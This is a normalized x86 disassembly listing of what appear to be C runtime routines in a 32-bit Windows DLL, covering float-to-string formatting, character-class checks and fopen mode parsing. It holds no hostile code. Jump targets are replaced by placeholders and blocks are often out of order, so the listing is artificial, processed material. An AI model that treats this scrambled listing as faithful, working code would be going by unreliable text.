sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_10030985
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100309d0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_10027160
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_1002352e
test eax eax
movsx eax [ esi ]
push eax
call sub_10027160
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
inc esi
inc esi
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10030a43
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_10030ac5
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_10030ae1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_10033bb5
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_10033b0d
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_10030b3d
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_100200e0
inc eax
push eax
push esi
add esi edi
push esi
call sub_10027850
add esp 0x10
sub_10030b82
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_10023358
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebp + 0x8 ] esi
jbe r-xdata
call sub_10026065
push 0x16
cmp [ ebp + 0xc ] esi
jle r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] 0x0
je r-xdata
call sub_10026065
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] esi
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_10030b3d
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_10020579
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
lea eax [ esi + 0x1 ]
mov cl [ eax ]
mov [ esi ] cl
mov esi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020451
add esp 0x14
push r--data
push ebx
push esi
call sub_1002776c
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
inc esi
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
inc esi
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi ] 0x2d
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_10027850
add esp 0xc
inc esi
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi ] al
mov eax edx
add [ esi + 0x1 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi ] al
mov eax edx
sub_10030cf1
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10033dd9
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10020579
add esp 0x14
mov eax esi
jmp r-xdata
mov esi [ ebp + 0x14 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
cmp esi ebx
setg cl
sub eax ecx
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push ebx
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_10030b82
add esp 0x18
mov [ edi ] bl
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
cmp esi ebx
setg cl
add eax edi
add ecx eax
push ecx
call sub_10033c5d
add esp 0x10
cmp eax ebx
je r-xdata
sub_10030dc1
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10030cf1
add esp 0x18
pop ebp
retn
sub_10030de1
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_10023358
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_10026065
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_10026065
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_10020579
add esp 0x14
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
mov [ esi ] 0x30
inc esi
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
mov ecx [ edi + 0x4 ]
inc esi
neg ebx
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x31
inc esi
mov [ esi ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
inc esi
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_10030dc1
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
mov [ esi ] 0x30
inc esi
cmp [ ebp + 0x18 ] 0x0
push 0x65
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
inc esi
push esi
call sub_10033ae0
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_10033f50
add ax 0x30
movzx eax ax
cmp ax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_10033f50
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_100209e0
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
inc esi
call sub_10033f50
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi ] 0x2d
inc esi
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi ] 0x2b
inc esi
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_10033e70
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
cmp edx ebx
mov edi esi
mov [ esi ] 0x30
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_10033e70
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_10033e70
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_10031154
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov ebx eax
mov esi [ ebx + 0x4 ]
mov edi ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_10023358
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_10026065
push 0x16
pop esi
mov [ eax ] esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020579
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebx ] 0x2d
mov esi edi
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
xor eax eax
cmp [ ebx ] 0x2d
sete al
add eax esi
add eax edi
mov [ eax ] 0x30
mov [ eax + 0x1 ] 0x0
add esi eax
mov eax esi
call sub_10030b3d
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
call sub_10030b3d
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov ebx [ ebx + 0x4 ]
inc esi
test ebx ebx
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] ebx
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax esi
call sub_10030b3d
push edi
push 0x30
push esi
call sub_100209e0
add esp 0xc
sub_1003124b
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10033dd9
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10020579
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push ebx
push esi
push [ ebp + 0x10 ]
mov ecx edi
call sub_10031154
add esp 0x10
mov [ edi ] bl
jmp r-xdata
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_10033c5d
add esp 0x10
cmp eax ebx
je r-xdata
sub_10031306
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10033dd9
xor ebx ebx
add esp 0x14
cmp esi ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] edi
call sub_10020579
add esp 0x14
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x30 ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_10033c5d
add esp 0x10
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_10030b82
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
cmp cl bl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_10031154
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] bl
sub_10031400
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10030cf1
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003124b
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10030de1
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10031306
jmp r-xdata
sub_10031488
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10031400
add esp 0x1c
pop ebp
retn
sub_100314ab
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_10033f6f
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_10020451
add esp 0x14
sub_10031514
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ r--data ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fdiv [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fld1
fcomp [ ebp - 0x8 ]
fnstsw ax
test ah 0x5
jpe r-xdata
push 0x0
call eax
retn
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_10031540
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_10034a63
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10033fdb
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_100315e7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
inc esi
movzx eax [ esi ]
cmp eax 0x61
je r-xdata
mov ebx 0x109
cmp eax 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
mov edx 0x4000
xor ebx ebx
or [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp eax 0x77
je r-xdata
inc esi
inc esi
cmp [ esi ] di
jne r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
movzx eax ax
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
inc esi
movzx eax [ esi ]
cmp ax di
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_10026065
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_10035947
add esp 0x14
test eax eax
jne r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] edi
mov [ eax ] edi
mov [ eax + 0x8 ] edi
mov [ eax + 0x1c ] edi
mov [ eax + 0x10 ] ecx
cmp [ esi ] 0x20
je r-xdata
mov eax 0x1000
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
sub eax 0x20
je r-xdata
inc esi
inc esi
push 0x3
push esi
push r--data
call sub_10035af7
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x20
jmp r-xdata
inc esi
inc esi
movzx eax [ esi ]
cmp ax di
jne r-xdata
sub eax 0xb
je r-xdata
push 0x20
add esi 0x6
pop eax
jmp r-xdata
cmp ecx edi
je r-xdata
or ebx 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] ax
je r-xdata
or [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
and ebx 0xfffffffe
and eax 0xfffffffc
or ebx 0x2
or eax 0x80
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
inc esi
cmp [ esi ] ax
je r-xdata
or ebx edx
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_10035a51
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
push 0x8
push r--data
push esi
call sub_10035a51
add esp 0xc
test eax eax
jne r-xdata
add esi 0xa
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_10035a51
add esp 0xc
test eax eax
jne r-xdata
add esi 0x10
or ebx 0x20000
jmp r-xdata
add esi 0xe
or ebx 0x10000
jmp r-xdata
sub_100318a7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
